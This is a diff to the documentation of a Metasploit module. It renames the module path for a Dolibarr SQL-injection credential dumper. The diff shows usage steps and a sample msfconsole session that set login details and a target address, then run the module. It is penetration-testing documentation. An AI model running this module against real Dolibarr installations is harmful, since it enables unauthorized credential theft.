@@ -12,7 +12,7 @@
 
   1. Install the application
   2. Start msfconsole
-  3. Do: ```use auxiliary/sqli/oracle/dolibarr_list_creds```
+  3. Do: ```use auxiliary/gather/dolibarr_list_creds_sqli```
   4. Do: ```set RHOSTS [IP]```
   5. Do: ```set USERNAME [USER]```
   6. Do: ```set PASSWORD [PASS]```
@@ -26,16 +26,16 @@
 
 ```
 
-  msf5 > use auxiliary/sqli/oracle/dolibarr_list_creds
-  msf5 auxiliary(sqli/oracle/dolibarr_list_creds) > set username test
+  msf5 > use auxiliary/gather/dolibarr_list_creds_sqli
+  msf5 auxiliary(gather/dolibarr_list_creds_sqli) > set username test
   username => test
-  msf5 auxiliary(sqli/oracle/dolibarr_list_creds) > set password blah
+  msf5 auxiliary(gather/dolibarr_list_creds_sqli) > set password blah
   password => blah
-  msf5 auxiliary(sqli/oracle/dolibarr_list_creds) > set targeturi /dolibarr
+  msf5 auxiliary(gather/dolibarr_list_creds_sqli) > set targeturi /dolibarr
   targeturi => /dolibarr
-  msf5 auxiliary(sqli/oracle/dolibarr_list_creds) > set rhosts 192.168.37.228
+  msf5 auxiliary(gather/dolibarr_list_creds_sqli) > set rhosts 192.168.37.228
   rhosts => 192.168.37.228
-  msf5 auxiliary(sqli/oracle/dolibarr_list_creds) > run
+  msf5 auxiliary(gather/dolibarr_list_creds_sqli) > run
 
   [*] Logging in...
   [+] Successfully logged into Dolibarr
